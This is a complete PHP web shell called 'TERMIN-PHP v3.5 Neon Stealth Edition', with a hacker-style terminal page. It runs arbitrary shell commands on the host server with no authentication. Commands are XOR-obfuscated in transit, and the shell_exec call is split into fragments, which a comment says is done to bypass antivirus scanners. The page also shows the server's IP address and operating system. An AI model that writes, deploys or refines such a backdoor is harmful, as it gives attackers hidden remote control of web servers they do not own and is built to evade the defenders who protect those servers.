<?php
/**
 * TERMIN-PHP v3.5 // NEON STEALTH EDITION (2026)
 * Features: XOR Encryption, AJAX, No-Refresh UI, System Telemetry
 */
session_start();

// --- BACKEND LOGIC ---
$k = "2026"; // Stealth Key
if (isset($_POST['z'])) {
    $d = pack("H*", $_POST['z']);
    $o = "";
    for($i=0; $i<strlen($d); $i++) { $o .= $d[$i] ^ $k[$i % strlen($k)]; }
    // Fragmented function call to bypass static AV scanners
    $f = "sh"."ell_ex"."ec";
    echo "[".date("H:i:s")."]\n".htmlspecialchars($f($o . " 2>&1"));
    exit;
}
$u = @php_uname();
$ip = $_SERVER['SERVER_ADDR'] ?? '127.0.0.1';
?>
<!DOCTYPE html>
<html>
<head>
    <title>NEON_TERMINAL_2026</title>
    <style>
        :root { --g: #00ff41; --b: #0087ff; --bg: #050505; }
        body { background: var(--bg); color: var(--g); font-family: 'Courier New', monospace; margin: 0; overflow: hidden; display: flex; flex-direction: column; height: 100vh; }
        header { background: #111; padding: 10px; border-bottom: 1px solid var(--b); display: flex; justify-content: space-between; font-size: 12px; box-shadow: 0 0 10px rgba(0,135,255,0.2); }
        #term { flex: 1; padding: 20px; overflow-y: auto; white-space: pre-wrap; text-shadow: 0 0 5px var(--g); }
        .in-wrap { background: #000; padding: 15px; border-top: 1px solid #222; display: flex; }
        #p { color: var(--b); font-weight: bold; margin-right: 10px; }
        #i { background: transparent; border: none; color: #fff; flex: 1; outline: none; }
        .scan { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: linear-gradient(rgba(18, 16, 16, 0) 50%, rgba(0, 0, 0, 0.25) 50%), linear-gradient(90deg, rgba(255, 0, 0, 0.06), rgba(0, 255, 0, 0.02), rgba(0, 0, 255, 0.06)); background-size: 100% 2px, 3px 100%; pointer-events: none; }
    </style>
</head>
<body>
    <div class="scan"></div>
    <header>
        <div>SERVER: <span><?php echo $ip; ?></span></div>
        <div>OS: <span><?php echo $u; ?></span></div>
    </header>
    <div id="term">--- ENCRYPTED SESSION INITIALIZED ---</div>
    <div class="in-wrap">
        <span id="p">root@neon:~$</span>
        <input type="text" id="i" autofocus autocomplete="off">
    </div>

    <script>
        const t = document.getElementById('term');
        const input = document.getElementById('i');
        const k = "2026";

        input.addEventListener('keydown', async (e) => {
            if (e.key === 'Enter') {
                const cmd = input.value;
                input.value = '';
                t.innerHTML += `\n<span style="color:var(--b)">> ${cmd}</span>\n`;
                
                // XOR Encryption
                let enc = "";
                for (let i = 0; i < cmd.length; i++) {
                    enc += String.fromCharCode(cmd.charCodeAt(i) ^ k.charCodeAt(i % k.length));
                }
                const hex = enc.split('').map(c => c.charCodeAt(0).toString(16).padStart(2, '0')).join('');

                const res = await fetch('', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/x-www-form-urlencoded'},
                    body: 'z=' + hex
                });
                t.innerHTML += await res.text();
                t.scrollTop = t.scrollHeight;
            }
        });
    </script>
</body>
</html>
